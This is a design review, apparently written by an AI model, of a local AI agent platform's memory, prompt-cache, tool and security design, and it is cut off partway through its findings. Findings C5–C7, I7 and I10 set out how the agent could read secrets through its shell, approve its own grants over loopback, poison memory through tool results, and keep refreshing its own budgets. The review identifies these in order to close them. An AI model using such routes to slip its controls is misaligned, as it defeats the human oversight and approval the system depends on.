# Design review — Claude Opus 5.5

Reviewed 2026-11-04 against `docs/design/00-goal.md` through `11-secrets.md`, `REVIEW.md`, and the
locked plan (`maia_agent_os_c10fe6bc.plan`). The user requested medium effort; the harness ran
this review at xhigh. `REVIEW-grok-4.7.md` was read only after these findings were drafted, and
is cited only where this review agrees or disagrees with it. No other design document was edited,
no code was written, and nothing was committed.

## Verdict

**Reject. Revise the set and review it again.**

Keep the architecture. One daemon, one shared brain, one durable cache per thread, one
presentation ledger, recall without a model, dreams without tools that apply to the brain first
and then project to the vault, explicit `OutcomeUnknown` at every external boundary, API-first
with no fallback after an ambiguous write, and a durable panic latch. All of these are right, and
most docs state them in the same words.

The set still fails the gate in `00-goal.md` (Documentation-gate acceptance checklist), for two
reasons.

1. **Correctness.** Three mechanisms cannot be written as red tests with independent oracles:
   how recalled memory enters the prompt, the bytes and wire form of the prompt, and what
   compaction does. Together they are the product's token saving.
2. **Security.** The agent's shell runs as the human user, and any loopback client is treated
   as the human (C5, C6). The agent can therefore read every secret and approve its own grants.
   Fixing that changes the process and authentication boundary. A boundary change of that size
   needs another review, not an edit made after acceptance.

## Counts

| Severity | Count |
| --- | ---: |
| Critical | 7 |
| Important | 24 |
| Minor | 18 |
| **Total** | **49** |

## What already holds

- **Map and read stay separate.** `01-vault.md` (`map` and `read` contracts) defines `map` as
  headers and generated indexes only, and gives a sentinel-secret test for it.
- **Two-phase dream apply.** `05-dream.md` (Transaction sequence), `01-vault.md` (Dream
  projection contract), and `00-goal.md` (Failure handling) agree. The brain commits once,
  projection to the vault is idempotent, and a retry never calls the model again.
- **External outcomes are classified honestly.** `07-computer.md` (Tool result and audit
  contract, Web intent and API-first policy) and `06-agents.md` (Failure modes) never turn an
  unknown outcome into a failure and never fall back to the browser after an ambiguous write.
- **The audit claims only what it can enforce.** `06-agents.md` (Immutable audit) presents the
  hash chain as detection, not as tamper-proofing.
- **The half-weight reply rule matches the plan.** `04-credit.md` (Weight rules) records it
  exactly as the plan locked it.
- **Dream ports are correct.** `08-rust.md` (I/O skins) gives `run_dream` no `Tools` or
  `SecretStore` parameter.

## Goal alignment

| System | Goal pillar | Result |
| --- | --- | --- |
| Vault (`01`) | Shortens prompts (`map` is headers only); recall is inspectable in Obsidian | Yes |
| Brain (`02`) | Shortens prompts (threshold and cold storage) | Yes, once recall reaches the prompt (C1) |
| Thread cache (`03`) | Shortens prompts (provider prefix cache) | Yes, if the wire form keeps the prefix (C2) and compaction stops rewriting it every turn (C3) |
| Credit (`04`) | Inspectable recall; drives strength and compaction | Yes |
| Dream (`05`) | Shortens prompts (sentences replace episodes) | Yes; it can stall indefinitely (I11, I12) |
| Agents (`06`) | Controlled computer use | Yes; budgets can be refreshed (I10) |
| Computer (`07`) | Controlled computer use | Yes; the shell is not isolated (C5) |
| Rust (`08`) | Supports the other systems; adds no product surface | n/a |
| Frontend (`09`) | Inspectable recall; panic | Yes |
| Security (`10`) | Controlled computer use | Yes. The signed policy-pack channel and plan-drift detection are surface area until they are specified (I22, I23) |
| Secrets (`11`) | Controlled computer use | Yes. Infisical is optional surface for v1 (M14) |

## Checklist result

| `REVIEW.md` item | Result | Blocking findings |
| --- | --- | --- |
| Goal alignment | Pass with notes | none |
| Consistency | Fail | I1, I2, I3, I16, I20, I21 |
| Correctness | Fail | C1, C2, C3, C4, I5, I6, I8 |
| Security | Fail | C5, C6, C7, I18, I19 |
| Frontend | Partial | I16, I17, I24 |

## Named red tests in `00-goal.md` (Testing contract)

| Test | Writable from the docs alone? |
| --- | --- |
| `compile_prompt` is byte-identical before and after restart | **As self-consistency, yes.** Independent expected bytes, no (C2). Passing it would not prove a provider cache hit, because the wire mapping is undefined (C2). |
| Attribution ignores slots absent from the request | **Yes.** It would pass even on a design where recalled facts never become slots (C1). |
| Reply-only hit is half weight only when the turn had no readable reasoning | **The weight, yes. "Hit", no** (I6). `RouterResponse` cannot express "unknown" (I5). |
| Weighted ACT-R matches a hand-computed fixture | **No.** The age unit is unset (I8), and the return types differ between docs (I1). |
| `map` returns descriptions and links without bodies | **Yes.** Participant scope is a separate gap (I4). |
| `render_entity_page` preserves the human region | **Mostly.** Bytes outside the markers and an end marker inside a region are undefined (I15). |
| Dream apply is atomic, projection is idempotent, and no phase invokes tools | **Atomicity and idempotence, yes.** Panic, a tool-call channel, and livelock are open (I11, I12). |
| Budgets and human challenges produce the specified states | **Budgets, yes. `NeedsHuman` exit, no:** cancel leads to `Running` in `06` and to `Stopped` in `07` (I16). |
| Desktop and phone address the same daemon and thread ids | **At the protocol level, yes.** Loopback identity is unsound (C6). |

## Critical

### C1. Recalled memory has no path into the prompt, and "confirmed" is never defined

**Where.** `00-goal.md` (Product sequence, steps 2–5); `02-brain.md` (Retrieval algorithm);
`03-thread-cache.md` (Installed memory note, Canonical byte order, `append_scratch`);
`04-credit.md` (Evidence boundary, Request attribution scope); `09-frontend.md` (Conversation:
"2 facts installed").

**Problem.**

- **No place in the prompt.** `rank_paths` returns ranked facts, but the canonical byte order
  has nowhere to put them. The only turn-local region is a scratch suffix of "paths". `03`
  types those as `CanonicalPath` and `08` as `VaultPath`. Facts are brain rows, not vault paths.
- **No credit before installation.** `04` (Request attribution scope) says scratch "cannot
  accrue slot heat." A durable memory note is inserted only after "the assistant turn that used
  it." So a recalled fact cannot be credited until it is a slot, and cannot become a slot until
  it is credited.
- **"Confirmed" is undefined.** No document says what it means.
- **Load and summary have no producer.** `03` (Installed memory note) talks about "loading" an
  episode and "the old summary," and never says what a load is or who writes a summary. If a
  model writes it, that is a model call on the message path, which `00-goal.md` (Purpose)
  rules out.
- **The gap is in the product's central loop:** retrieve, present, use, credit, install,
  compact. The restart test passes with an empty memory block, so nothing in the current red
  tests exposes it.

**Change.** Define the following.

1. A **recall block**: its position in the request, its canonical grammar, and whether it holds
   fact sentences with stable ids, paths, or both.
2. **Replayable attribution:** the request record stores the recall block's item ids and a hash
   of its bytes.
3. **Credit for recall items:** attribution may credit them. Amend `04` (Request attribution
   scope) to say so.
4. **"Confirmed":** an accepted presentation with weight above zero in that request.
5. **The install rule:** credited recall items are appended as durable memory notes at the
   cursor after that assistant turn, in stable-id order.
6. **"Load":** what it is, and what the first load stores (for example the fact sentence first,
   then the episode's full text on a second load). No summary is written by a model outside a
   dream.

This agrees with Grok C1 and adds items 2 and 6.

**Red tests this unlocks.**

- A recall item that is not credited never becomes durable.
- A credited recall item is installed after its assistant turn, and the next compiled prefix
  contains it without byte changes.

### C2. Neither the prompt bytes nor their wire form is specified

**Where.** `03-thread-cache.md` (Slot, Canonical byte order, Request sequence);
`07-computer.md` (Canonical request: `compiled_prompt: Bytes`, `tools: Vec<ToolSchema>`,
`prior_provider_tool_state`); `06-agents.md` (Shared context).

**Problem.**

- **No byte grammar.** `03` (Slot) says canonicalization "must define all separators, line
  endings, encodings, labels, id rendering, and empty sections," and then defines none of them.
  No independent byte fixture can be written.
- **No mapping to the wire.** OpenAI-compatible endpoints take a `messages` array of role-tagged
  messages and a separate `tools` array. A provider's prompt cache matches on its own
  serialization of those, not on Maia's byte blob. `07` says the adapter translates "without
  changing prompt bytes," but defines no mapping from slots to messages. Two byte-identical Maia
  prefixes can still miss the provider cache if message boundaries or roles shift.
- **Tool schemas appear twice:** at the front of the compiled prefix (`03`, Canonical byte
  order, item 1) and again in `RouterRequest.tools`.
- **Roles in agent-agent threads are undefined.** From each speaker's point of view, are the
  other agent's turns `assistant` or `user`? If roles flip with the speaker, the role tags change
  on every alternation. The single shared cache then misses each time.
- **Speaker line and scratch both claim to be last.** `03` says the speaker line is "the final
  line of the request" and also says the scratch suffix is appended after the durable bytes. It
  is not stated whether the speaker line is durable and hashed.
- **Placement of opaque provider state is undefined.** Providers attach reasoning signatures to
  the assistant tool-call message. Within a turn, requests then diverge from the durable prefix
  at that message, and the next turn misses the cache from there on. That cost may be
  acceptable, but it has to be stated.

Grok rates the grammar Important (Grok I3). This review rates it Critical. Without the wire
mapping, the named byte-identity test can pass while every turn misses the provider cache, and
the product exists to win that cache hit.

**Change.** Add a "Wire form" section to `03`, owned by `03` and used by `07`. It must define:

- the byte grammar for every slot kind, as fixture text, including the empty compacted block,
  data-block framing for untrusted origins (I22), and the speaker line;
- a deterministic mapping from slots to messages: role, content parts, and message boundaries;
- tools carried only in `tools`, serialized as canonical JSON, with that canonical JSON included
  in the prefix hash;
- one fixed role assignment for agent-agent threads that does not depend on who speaks;
- one total order for the end of the request, for example: durable prefix, recall block,
  scratch, speaker line;
- where opaque provider state is placed, and the cache cost that placement accepts.

**Red test.** Two consecutive requests produce serialized JSON payloads whose common prefix
extends through the previous user message. Assert this on the provider payload, not only on
Maia's bytes.

### C3. As written, compaction fires every turn and cannot shrink a long transcript

**Where.** `03-thread-cache.md` (Slot, Compaction triggers and behavior, `compact`); plan
(Thread cache).

**Problem.**

- **The unused-slot trigger fires every turn.** The trigger is "a slot has received no use-hit
  for six turns." `03` (Slot) counts tool schemas, personas, the compacted block, and transcript
  turns as slots. None of those ever receives a use-hit, because `04` credits facts. Read
  literally, the trigger is true on every turn after turn six. A compaction record is then
  written every turn, the prefix changes every turn, and the cache never hits.
- **Over budget, compaction has no remedy.** Compaction picks survivors from memory, and nothing
  allows it to drop or summarize transcript turns. A long conversation goes over budget on the
  transcript alone. Compaction cannot fix that, so the trigger stays true every turn.
- **The rest is undefined:** the survivor rule for each trigger; the centroid (which vectors,
  how many recent turns, which distance); and whether compaction may call a model. A
  model-written regroup would be a model call on the message path, an injection surface, and
  unbudgeted spend.
- **Nothing replaces "the old summary".** `03` (Installed memory note) keeps it "until
  compaction," but no document says what replaces it.

**Change.**

- Limit the unused-slot trigger to installed memory slots.
- Define survivors for each trigger as a pure predicate over slot heat.
- Decide the transcript's fate. Either compact it (for example, move old turns into a durable
  block that references episode ids, which remain in the brain), or state that the transcript is
  never compacted and that the budget applies only to memory.
- State that compaction is model-free, or move model regrouping into the dream, where it has a
  budget and no tools.
- Add a minimum interval between compactions so a compaction cannot immediately trigger another.
- Define the inputs to the centroid.

**Red tests.**

- Fixed slots and transcript slots never trip the unused-slot trigger.
- A compaction either leaves the prefix under budget or reports `Unfixable` without writing.
- Under steady state, two consecutive turns cannot both compact.

### C4. The closed tool enum cannot express memory, threads, or schedules

**Where.** `07-computer.md` (Boundary architecture: `ToolRequest = Console | Web`);
`08-rust.md` (`maia-tools`); `06-agents.md` (Wake queue: `ToolOpenedThread`, cross-thread
posting, `Schedule`); plan (Vault: "The map tool reads that header and the indexes");
`10-security.md` (Capability grants: `ToolKind`); `11-secrets.md` (`SecretGrant.tool`).

**Problem.**

- **Several assumed tools have no variant:**
  - `map` and `read`, the plan's memory-navigation tool;
  - posting into another thread;
  - opening an agent-agent thread;
  - creating a schedule.

  `06` assumes the last three exist.
- **`ToolKind` is undefined**, although `10` and `11` both key grants on it.
- **Operation contracts have no author.** `WebIntent` needs a registered site and operation.
  Nothing says who writes operation contracts (the human, or what api-anything learns), or
  whether a generic read-page operation exists. Open-ended browsing is therefore either
  impossible or an unreviewed registry.
- **The enum is the capability perimeter.** Each missing variant will either never be
  implementable or will be added ad hoc, with no risk class, grant target, or budget rule.

**Change.**

- List the v1 variants: `VaultMap`, `VaultRead`, `ConsoleRun`, `Web(WebIntent)`,
  `PostToThread`, and `OpenThread`. For v1, either add `Schedule` or state that schedules are
  human-only. This review recommends human-only.
- Define `ToolKind` as the variant discriminant.
- For each variant, state:
  - its `RiskClass`;
  - the shape of its grant target;
  - its budget charge;
  - its audit kind;
  - whether it may run unattended.
- State who authors operation contracts and how they are approved.

### C5. The agent's shell runs with the human's full authority

**Where.** `07-computer.md` (Windows console sessions; api-anything sidecar "under the current
Windows user"; Persistent Chrome, profile "restricted to the current Windows user");
`11-secrets.md` (Windows adapter, Invariants); `10-security.md` (Secrets and credentials,
Explicitly out of scope).

**Problem.** A ConPTY PowerShell running as the same Windows user can do all of the following:

- read every `maia.secret.*` entry in Credential Manager;
- decrypt the Maia Chrome profile's cookies, because DPAPI keys are per user;
- open the brain SQLite file and the audit chain;
- edit `personality.md` and human regions directly, without going through the dream;
- stop or reconfigure the daemon;
- call Maia's loopback API (C6).

Redaction removes only declared values, and the agent can encode them. So "secret values never
enter prompts," "cookies are never sent to the router," "a dream never writes
`personality.md`," and the append-only audit all hold only as long as the model chooses not to
break them.

`10` (Explicitly out of scope) excludes a Windows administrator. The agent is not an
administrator. It *is* the user.

**Change.** Record the console's OS isolation boundary as a design decision.

- Run console sessions, and api-anything if it executes learned calls, under a dedicated local
  account with few privileges, or under an AppContainer or restricted token.
- Deny that identity access, through ACLs, to Maia's data directory, the vault's `personality.md`
  files, the Chrome profile, and the human's Credential Manager. A separate account has a
  separate credential vault and DPAPI key.
- Limit working directories and network egress to what grants allow.
- If isolation is deferred, state that unattended `Execute` is unavailable until it ships, and
  reconcile that with C7.

**Red tests.** From inside a console session, each of these fails:

- reading the brain file;
- reading the profile's cookie database;
- reading a canary Credential Manager entry;
- writing a `personality.md` fixture.

### C6. Any loopback client is treated as an authenticated human

**Where.** `07-computer.md` (Peer authorization: "Loopback requests are local peers"; Browser
session and request protections; Persistent Chrome); `10-security.md` (Network, remote UI, and
CSRF; Capability grants); `09-frontend.md` (Settings).

**Problem.** Every loopback peer receives a session and a CSRF token. Loopback peers include:

- the agent's console, through `curl`;
- the Chrome the agent drives. It can open `http://127.0.0.1:<port>`, which is the same origin as
  Maia's UI, and click Approve, clear panic, or change the router base URL;
- the api-anything sidecar;
- local malware;
- a DNS-rebinding page in the human's everyday browser. `Host` is not validated on ordinary
  requests; only the WebSocket `Origin` is checked;
- Tailscale Serve or Funnel, if pointed at the loopback port. Remote traffic then arrives from
  `127.0.0.1` and passes as local, so `WhoIs` never runs.

CSRF tokens defend against cross-site browsers, not against local processes that can read the
token. Two statements in `10` therefore cannot be enforced:

- Invariant 1: "The model cannot mint or widen a capability grant."
- Policy versioning: "Widening requires an explicit local human action."

On loopback, the daemon cannot tell the human from the agent.

**Change.**

1. Authenticate the desktop UI with a per-launch secret delivered only to the Tauri window, by
   IPC or an injected init script. Never serve it from an endpoint reachable on loopback. A
   loopback client without it gets no session.
2. Validate `Host` on every request against the exact listener names.
3. Refuse proxied loopback traffic. Item 1 already covers this.
4. Explicitly deny Maia's own listener addresses in the automation browser and in tool HTTP
   clients. Do not rely on the phrase "unexpected private targets."
5. Require a desktop-only channel plus user presence (for example Windows Hello or an OS consent
   prompt) for every action that widens privilege:
   - widening or approving a grant;
   - clearing panic;
   - changing the router URL or model;
   - changing the Tailscale allowlist;
   - putting or rotating a secret.

   Engaging panic stays available from every authenticated channel.
6. Name the Tauri origin. This agrees with Grok I14.

### C7. Approvals have no state, no screen, and no meaning for unattended work

**Where.** `10-security.md` (Capability grants, `ApprovalTier`, Sink checks); `06-agents.md`
(Four-state model); `07-computer.md` (`HumanRequestKind`, `ConsoleRequest.command`);
`09-frontend.md` (NeedsHuman, Settings); plan (Agents: "Any running thread may use tools while
you are away").

**Problem.** This agrees with Grok C3 and adds four points.

1. **Unattended shell is impossible by default, and a permissive default is unsafe.** Every
   console command is `Execute`, and `Execute` defaults to `ConfirmEveryTime` when unattended. So
   the plan's unattended shell cannot run by default. Because of C5, a permissive default would
   be unsafe.
2. **A pending approval has nowhere to show.** There is no `HumanRequestKind` for approval. A
   pending approval either poses as a challenge, which makes the banner "Chrome is waiting for a
   sign-in" false, or does not show at all.
3. **The phone's role in approvals is unspecified.** If the phone may approve, `09`'s phone
   copy "Finish this on the desktop" is false. If it may approve while C6 is unfixed, that is an
   unsafe affordance.
4. **A free-form command cannot match a grant.** `command: String` cannot be compared with a
   grant target.

**Change.**

- Add `HumanRequestKind::Approval`, carrying the request digest, risk, and target.
- Make an approval a one-shot token bound to that exact digest and lease.
- State where approvals are accepted. For v1, this review recommends desktop-only approval for
  `Execute`, `CredentialUse`, and `WriteRemote`; the phone may deny.
- Persist a grant catalog and give it a Settings screen.
- Define the console grant target as an executable allowlist, working-directory roots, and an
  egress policy.
- State the unattended default. This review recommends: unattended `Execute` only within an
  allowlist the human created, and only inside the C5 sandbox; anything else becomes
  `NeedsHuman(Approval)`.

## Important

### I1. Leaf signatures differ between documents, and `08` claims to be the authority

**Where and how the signatures differ.**

| Function or port | `02`, `03`, `04`, `01` | `08-rust.md` (Honest leaves, Dependency-inversion port rules) |
| --- | --- | --- |
| `activation` | `02`: returns `Result<f64, ActivationError>` | Returns `Option<Activation>`, with a different argument order |
| `rank_paths` | `02`: returns `Result<Vec<RankedPath>, RankError>` | Returns `Vec<RankedFact>` |
| `attribute_uses` | `04`: takes `&AttributionScope`, returns `Result<AttributionLedger, _>` | Takes `(slots, trace)`, returns `Vec<AttributedUse>` |
| Ledger port | `04`: `apply_ledger` over `PresentationStore` | `PresentationStore` does not exist |
| `append_scratch` | `03`: takes `CanonicalPath` | Takes `VaultPath` |
| `read` | `01`: takes `NotePath`, alongside `MapResult` | `VaultStore::read` takes `&VaultPath`; `map` returns `VaultMap` |

**Problem.** `08` (Status and authority) says signature changes must go through `08` first, so
`08` wins by rule. But `08`'s forms cannot carry what the other docs require:

- `RankedFact` drops the walked paths the inspector needs.
- A bare `Vec` cannot carry the errors `02` (Failure handling) requires.
- A bare `Vec` from `attribute_uses` cannot express an unattributable turn.

**Change.** Adopt the `02` and `04` shapes in `08`: `Result`, the scope struct, and paths in
results. Either add `PresentationStore` or delete it. Use one set of path newtypes. This agrees
with Grok I1.

### I2. The one-ledger write, and several stores, have no port

**Where.** `04-credit.md` (`apply_ledger`); `08-rust.md` (`BrainStore`, `ThreadLog`, "a single
explicit database command"); `06-agents.md` (Ports and ownership, Immutable audit, Panic,
Wake queue); `05-dream.md` (pending projection); `11-secrets.md` (Windows adapter);
`02-brain.md` (Episode).

**Problem.**

- **The joint write has no method.** Thread heat belongs to the thread, and brain presentations
  belong to the brain. They must commit together, and no port method commits both.
- **The episode write has no named port**, although `02` requires episodes to be stored
  immediately.
- **These stores have no port at all:**
  - audit append and verify;
  - the checkpoint;
  - wakes and leases;
  - the panic latch;
  - human requests and approvals;
  - the grant catalog;
  - the projection queue;
  - the secret catalog.
- **`06` contradicts itself.** It says the scheduler uses only `ThreadLog`, `BrainStore`,
  `Router`, and `Tools`, yet its tests need fakes for the stores above.
- **The secret catalog breaks the dependency rule.** `08` says `maia-secrets` "catalogues through
  `maia-store`," which breaks `08`'s own rule against horizontal dependencies.

**Change.**

- Add one atomic database-owner command, for example `commit_turn`. It appends the thread
  events, stores the episode, and applies the ledger, all in one transaction.
- Add narrow ports:
  - `SchedulerStore`, for wakes, leases, panic, human requests, and approvals;
  - `AuditLog`;
  - `ProjectionQueue`;
  - `SecretCatalog`, implemented by `maia-store` and composed with the secret backend in
    `maia-daemon`.

### I3. The fact record differs between documents

**Where.** `02-brain.md` (Fact; Invariant 6: "source episode"); `05-dream.md` (Structured dream
batch schema: `episode_ids`, `entity_id`, merges); `10-security.md` (Taint and provenance, Memory
and dream poisoning).

**Problem.**

| | `02-brain.md` | `05-dream.md` | `10-security.md` |
| --- | --- | --- | --- |
| Provenance | One source episode | A list of episode ids | Origin must be kept |
| Entity and scope | Absent | `entity_id` present | — |
| Status | Validity window only | Merged or canonical | Quarantined |
| Origin and confidence | Absent | Absent | Required |

- `rank_paths` takes no quarantine input.
- The model cannot be trusted to report origin.
- An episode mixes trusted user text with untrusted web text, so origin at the episode level is
  either always tainted or meaningless.

Grok rates this Critical (Grok C2). This review rates it Important. Grants are deterministic, and
the escalation risk sits in C5–C7. The field must still exist before the dream red tests are
written.

**Change.** Define one `Fact` record in `02` with:

- `entity_id`;
- a provenance list;
- a `FactStatus` enum: `Current`, `Closed`, `Merged`, or `Quarantined`;
- an origin set derived by the runner from the source episodes. Never take origin from the
  model.

Drop confidence unless it is defined. Say whether quarantine is a `rank_paths` input or a filter
applied when the graph is built.

### I4. Participant scope leaks through episodes, `map`/`read`, and dream scope assignment

**Where.** `01-vault.md` (Purpose; `map` and `read` contracts: "Neither operation … changes
access"; Invariant 7); `02-brain.md` (Episode, Retrieval algorithm); `05-dream.md` (`scope`:
"existing participant agent"); `06-agents.md` (Thread and participant model).

**Problem.** A non-participant cannot see private entities, but private information still leaks
in four ways.

1. **Episodes.** The episodes behind a private entity sit in the shared brain, where any thread
   can find them by full text or embedding.
2. **`map` and `read`.** These have no scope. Once they are tools (C4), their output enters the
   prompt as a tool result, and tool results bypass the retrieval policy that `01` relies on.
3. **Dream scope.** A batch spans many threads, so "existing participant agent" is undefined.
   The model could put Scout's direct-thread episode into Scribe's private scope, or promote it
   to world.
4. **Agent identity.** Nothing maps an `AgentId` to a vault folder. This agrees with Grok I12.

**Change.**

- Make an episode visible only to the participants of its thread. Filter the retrieval graph by
  thread participants, as a pure input.
- Scope `map` and `read` with a `ReadScope` derived from the thread's participants. It denies
  other agents' `entities/` folders.
- Validate dream scope. An agent-scoped fact requires that agent to be a participant in every
  source episode's thread. State the rule for promoting a direct-thread fact to world.
- Define `AgentId` as the `id` in the agent's `personality.md` frontmatter, and resolve its
  folder through the index.

### I5. Attribution conflates request and turn, and the trace cannot say "unknown"

**Where.** `04-credit.md` (Evidence boundary: "that turn"; Request attribution scope; Failure
handling: "availability is unknown"); `06-agents.md` (Wake queue and scheduler, steps 5–6);
`07-computer.md` (`RouterResponse.reasoning: Option<String>`, `RouterCapabilities`).

**Problem.**

- **Which request gets tool-result credit is undefined.** A turn contains several router
  requests. `06` attributes at step 5 and runs tools at step 6. Results from request N are first
  seen by request N+1. No rule says which request's slot scope credits a tool-result hit.
- **"No readable reasoning in that turn" has no unit.** It is not stated whether the condition is
  checked per request or per turn.
- **`Option<String>` is too coarse.** It cannot tell apart:
  - `Absent`: the provider returned no reasoning;
  - `Opaque`: the provider returned encrypted reasoning;
  - `Unknown`;
  - `Some("")`. This agrees with Grok M2.

**Change.**

- Define a `TurnId` and a `RequestId`.
- Attribute per request. Reasoning and tool arguments from response N count against N's scope.
- Credit the results of calls emitted in N against N's scope after those calls run. Either add a
  second ledger entry for N, or write one ledger for N after its tools complete.
- Decide reply-fallback eligibility per request.
- Add a `ReasoningTrace` enum: `Readable(text)`, `Opaque`, `Absent`, `Unknown`. Treat a blank
  `Readable` as `Absent`.

### I6. A "hit" has no acceptance boundary

**Where.** `04-credit.md` (Weight rules, Explicitly out of scope); `00-goal.md` (Testing
contract).

**Problem.** This agrees with Grok I5. In addition:

- `attribute_uses` is a pure leaf, so detecting a rejection must be lexical and model-free.
- "A sentence that rejects a fact" therefore needs a defined lexical rule. Without one, every
  rejection fixture can be argued either way.

**Change.** Lock a v1 matcher:

- A hit is either a mention of the fact's stable id, or the normalized fact sentence appearing
  verbatim.
- A rejection is a supplied list of negation words appearing in the same sentence as the hit.
- Anything else scores zero.

A later matcher must keep these fixtures passing.

### I7. Tool-result credit lets external content raise activation, and the plan locks that weight

**Where.** `04-credit.md` (Weight rules); `10-security.md` (Prompt injection); plan (Credit: "A
tool-argument or tool-result hit is a full presentation").

**Problem.** This agrees with Grok I9 on the risk. A page or command that echoes a fact's text
raises that fact's activation and thickens its co-use edges.

This review disagrees with Grok's remedy. Zeroing result-only hits changes a weight the plan
locked, so it needs the user's explicit sign-off.

**Change.** Bring the decision to the user. Without a plan change, the minimum is:

- store the origin on every presentation;
- count a tool-result hit only when the same call's arguments also referenced that slot;
- let quarantine and reversal target presentations by origin.

### I8. ACT-R ages have no unit, fail at zero, and break on a future timestamp

**Where.** `02-brain.md` (Public contracts, Failure handling, Explicitly out of scope: "elapsed
time unit"); `08-rust.md` (`activation`).

**Problem.**

- **No unit.** Changing the unit shifts `ln` by `d·ln c`. Fact ordering is unchanged, but every
  threshold comparison changes. This agrees with Grok I2.
- **Zero age is an error.** A presentation at exactly `now` has `t = 0`, which `02` rejects.
- **One future timestamp breaks all recall.** A presentation dated after `now` can come from a
  backward NTP step, or from a write by another task with a later `now`. `rank_paths` returns one
  `Result` for the whole ranking, so that single presentation fails the call, and recall stops
  until the clock catches up.

**Change.**

- Define `Timestamp` as integer UTC milliseconds.
- Have `activation` take ages in a named unit, plus a supplied `min_age` floor (the standard
  ACT-R practice).
- Exclude a future-dated presentation on its own, with a diagnostic, instead of failing the whole
  ranking.
- Audit any clock regression the I/O skin observes.

### I9. Reversal double-counts co-use edges and conflicts with immutability

**Where.** `06-agents.md` (Presentation reversal); `04-credit.md` (Co-use edge update; Presentation
ledger: "reversal status"); `02-brain.md` (Presentation weights); `00-goal.md` (System invariant
4).

**Problem.**

- **A legitimate double reversal looks like corruption.** The edge between A and B gains
  `min(wA, wB)`. Reversing A negates its co-use contribution, and so does reversing B. If both
  are reversed, that one increment is negated twice. The total goes negative, and `06` then calls
  a legitimate operation "ledger corruption."
- **`activation` would need negative weights.** Compensating with a negative weight only works if
  `activation` accepts negative weights. `02` never says it does.
- **The ledger is both mutable and immutable.** `04` stores a mutable "reversal status" on the
  ledger, while `06` says ledger rows are never updated.
- **Invariant 4 is broken by the wording.** `00` invariant 4, "strength changes only from a
  traced use," is broken literally by any compensation.

**Change.**

- Store each co-use increment as its own row, citing both presentations. Compensate it at most
  once, whichever endpoint is reversed.
- Compute `activation` by excluding compensated presentations, not by summing negative weights.
- Derive reversal status instead of storing it.
- Reword invariant 4 to "a traced use, or the compensation of one."

### I10. Spawning work refreshes budgets, and agent-agent turn-taking is undefined

**Where.** `06-agents.md` (Budgets; Accepted transitions: `Sleeping -> Running` grants a lease;
Wake queue); plan (Agents: "Each thread has a token budget and a tool-turn budget").

**Problem.**

- **Agents can refresh their own budget.** An agent that posts into a sleeping thread, or opens a
  new one, gets a new lease with a fresh budget. Two threads can ping-pong indefinitely.
- **Schedules refresh it too.** Each schedule occurrence starts a fresh lease.
- **There is no aggregate ceiling.** Nothing limits spend per agent or per daemon over a time
  window.
- **`06` rules out the control that is needed.** It excludes pooled quotas, and a pooled ceiling
  is exactly the control against excessive agency and unbounded consumption (OWASP LLM06 and
  LLM10).
- **Turn-taking is undefined.** Whether Scribe speaks automatically after Scout in an agent-agent
  thread decides whether such loops can happen at all, and no document says.

**Change.**

- When an agent or tool causes a wake, charge it to the root lease through `CauseId`. Only a
  human creates a root lease.
- Add a daemon-wide rolling ceiling, as configuration, that sends new admissions to
  `Sleeping { GlobalBudget }`.
- Define who speaks next in an agent-agent thread, for example round-robin by `AgentId` with a
  maximum number of agent turns between human messages.

### I11. The dream runner can stall indefinitely and ignores panic and budgets

**Where.** `05-dream.md` (Purpose; Failure handling: "A later trigger may select the
still-pending episodes"; Testing contract: oldest-first selection); `06-agents.md` (Panic and
stopping); `08-rust.md` (`run_dream`).

**Problem.**

- **Batches have no input bound.** Episodes carry raw tool output.
- **A failing batch is selected again forever.** A deterministic failure, such as context
  overflow or one malformed episode, re-selects the same oldest batch every time.
- **Dreams spend without a budget.** Their router calls are not budgeted.
- **Panic does not mention dreams.**
- **Two gaps agree with Grok I10.** `run_dream` receives a `ThreadLog` that can append, and no
  step says when new facts are embedded.

**Change.**

- Assemble each batch within a token bound, with stated rules for truncating episodes.
- Count failures per episode. Quarantine an episode after N failures, and show it in the UI.
- Give dreams a budget per batch and per day.
- Make panic block dream admission and cancel an in-flight call. Projection may still finish.
- Give the dream read-only thread access.
- Send `tools: []`, and fail the batch if any tool call comes back.

### I12. One stuck page keeps projection pending, and after restart it blocks every dream

**Where.** `05-dream.md` (Failure handling: "the overall projection stays pending until every
target and index succeeds"; "A process restart scans durable pending projections before
scheduling new dream work"); `01-vault.md` (Failure handling).

**Problem.** Several ordinary situations keep a projection pending with no end:

- a human breaks a page's markers;
- a file Maia did not write sits at `world/entities/<slug>.md`;
- the same id appears in another file.

Restart finishes pending projections before scheduling new dream work, so one bad page stops
memory organization. The UI shows none of this.

**Change.**

- Track projection status per entity.
- Let new dreams run while unrelated projections are blocked.
- Show each blocked page in the UI with its path and the reason.
- On a slug collision, fail that entity and never overwrite the existing file.

### I13. Inputs frozen into the prefix have no lifecycle

**Where.** `03-thread-cache.md` (Thread log: tool-schema, `agents.md` excerpt, and persona
inputs); `06-agents.md` (Thread and participant model); `09-frontend.md` (Settings: "cannot
rewrite an existing durable prefix"); `01-vault.md` (`personality.md` is human-edited).

**Problem.** After a person edits `personality.md` or `agents.md`, or a tool schema, grant, or
api-anything capability changes, each existing thread is in one of two states:

- it never sees the change, and keeps a stale persona indefinitely; or
- compilation reads the live files, and `compile_prompt` stops being pure.

No record type refreshes these inputs, and compaction, "the only rewrite," is not said to refresh
them.

**Change.**

- Add a durable `PrefixRefresh` record carrying the new canonical bytes. It is triggered by a
  person, or at compaction.
- Have compilation use the latest such record.
- Show "Persona changed. Refresh resets the cache."

### I14. Vault validation is stricter than ordinary Obsidian use

**Where.** `01-vault.md` (Note and frontmatter contract; Generated index contract; Failure
handling).

**Problem.**

- **Ordinary notes block whole folders.** Every one of these is routine in Obsidian, and each one
  blocks `map`, index generation, and projection for its folder:
  - a note without frontmatter;
  - extra keys such as `tags`, `aliases`, or `cssclasses` (unknown fields are errors);
  - templates and daily notes;
  - canvases and attachments;
  - `.obsidian/`.
- **Two kinds are missing.** `agents.md` has no kind in the closed set, and neither do ordinary
  human notes.
- **Index frontmatter has no source.** Nothing supplies the `description` in the index of a
  folder a person created.
- **Index regeneration has no trigger.** Nothing says what regenerates an index after a person
  adds a note.

**Change.**

- Validate only paths Maia manages:
  - `agents.md`;
  - every `index.md`;
  - `agents/*/personality.md`;
  - `*/entities/*.md`.

  Everything else is ignored, or listed with kind `note` when its frontmatter is valid.
- Preserve and ignore unknown frontmatter keys.
- Add kinds for `agents.md` and for ordinary notes.
- Use a fixed frontmatter template per folder kind for indexes.
- Regenerate indexes on debounced watcher events.

### I15. Bytes outside the region markers, and the replacement race

